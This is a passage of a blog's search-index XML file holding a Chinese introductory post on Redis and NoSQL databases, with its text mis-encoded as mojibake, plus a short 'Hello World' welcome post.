å•çº¿ç¨‹+å¤šè·¯IOå¤ç”¨çš„æœºåˆ¶ï¼Œæ•°æ®éƒ½åœ¨å†…å­˜ä¸­ï¼Œæ”¯æŒæŒä¹…åŒ–ï¼Œä¸»è¦ç”¨ä½œå¤‡ä»½æ¢å¤<br>3. é™¤äº†æ”¯æŒç®€å•çš„key-valueæ¨¡å¼ï¼Œè¿˜æ”¯æŒå¤šç§æ•°æ®ç»“æ„çš„å­˜å‚¨ï¼Œå¦‚listã€setã€hashã€zsetç­‰<br>4. ä¸€èˆ¬æ˜¯ä½œä¸ºç¼“å­˜æ•°æ®åº“è¾…åŠ©æŒä¹…åŒ–çš„æ•°æ®åº“</td></tr><tr><td>MongoDB</td><td>1. æ–‡æ¡£å‹æ•°æ®åº“<br>2. æ•°æ®éƒ½åœ¨å†…å­˜ä¸­ï¼Œè‹¥å†…å­˜ä¸è¶³ï¼Œåˆ™æŠŠä¸å¸¸ç”¨çš„æ•°æ®å­˜åˆ°ç¡¬ç›˜<br>3. è™½ç„¶æ˜¯key-valueæ¨¡å¼ï¼Œä½†æ˜¯å¯¹valueï¼ˆå°¤å…¶æ˜¯jsonï¼‰æä¾›å¼ºå¤§çš„æŸ¥è¯¢åŠŸèƒ½<br>4. æ”¯æŒäºŒè¿›åˆ¶æ•°æ®åŠå¤§å‹å¯¹è±¡<br>5. å¯æ ¹æ®æ•°æ®ç‰¹ç‚¹æ›¿ä»£RDBMSï¼Œæˆä¸ºç‹¬ç«‹æ•°æ®åº“ï¼Œäº¦æˆ–é…åˆRDBMS,å­˜å‚¨ç‰¹å®šæ•°æ®</td></tr></tbody></table><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>çœ‹å®Œä¸Šé¢å¯¹NoSQLçš„ä»‹ç»ï¼Œå¯¹Redisæœ‰ä¸€ä¸ªå¤§æ¦‚äº†è§£äº†å§</p></div><h2 id="Redisæ¦‚è¿°">Redisæ¦‚è¿°</h2><p>Redisæ˜¯å½“ä»Šç¤¾ä¼šæœ€å—æ¬¢è¿çš„NoSQLæ•°æ®åº“ä¹‹ä¸€ï¼Œæ˜¯ä¸€ä¸ªä½¿ç”¨ANSI Cç¼–å†™çš„å¼€æºï¼Œéµå®ˆBSDåè®®ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€Key-Valueæ•°æ®åº“ï¼Œä¸”æä¾›å¤šç§è¯­è¨€çš„APIã€‚</p><div class="note primary no-icon flat"><p>Rediså…·å¤‡ä»¥ä¸‹ç‰¹æ€§ï¼š</p><ul><li>å¼€æºCè¯­è¨€ä»£ç ï¼Œæ”¯æŒå•çº¿ç¨‹+å¤šè·¯IOå¤ç”¨ï¼Œä¸ä¾èµ–å¤–éƒ¨åº“ï¼Œé€Ÿåº¦æå¿«</li><li>æ•°æ®æŒä¹…åŒ–ï¼Œæ”¯æŒå¤šç§æ•°æ®ç»“æ„ã€ç¼–ç¨‹è¯­è¨€</li><li>é«˜å¹¶å‘è¯»å†™ï¼Œæ”¯æŒluaè„šæœ¬ï¼Œä¸»ä»å¤åˆ¶</li><li>é«˜å¯ç”¨ï¼Œæ”¯æŒåˆ†å¸ƒå¼ï¼Œç†è®ºä¸Šå¯ä»¥æ— é™æ‰©å±•</li></ul></div><div class="note primary no-icon flat"><p>Redisçš„åº”ç”¨åœºæ™¯åŒ…æ‹¬ï¼š<br>ç¼“å­˜ç³»ç»Ÿï¼ˆâ€œçƒ­ç‚¹â€æ•°æ®ï¼šé«˜é¢‘è¯»ã€ä½é¢‘å†™)ã€è®¡æ•°å™¨ã€æ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿã€æ’è¡Œæ¦œã€ç¤¾äº¤ç½‘ç»œå’Œå®æ—¶ç³»ç»Ÿã€‚</p></div><span class="hide-inline"><button type="button" class="hide-button button--animated" style="background-color: far fa-hand-point-right;color:  green larger">çœ‹çœ‹å“ªäº›å¤§å‚åœ¨ä½¿ç”¨Redisï¼Ÿ  </button><span class="hide-content">githubï¼Œtwitterï¼Œå¾®åšï¼ŒStack Overflowï¼Œé˜¿é‡Œå·´å·´ï¼Œç™¾åº¦ï¼Œè…¾è®¯ï¼Œç¾å›¢ï¼Œæœç‹...... </span></span>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> æ•°æ®åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156/"/>
      <url>/posts/4a17b156/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Welcome-to-my-blog">Welcome to my blog!</h2><p>by zeker</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
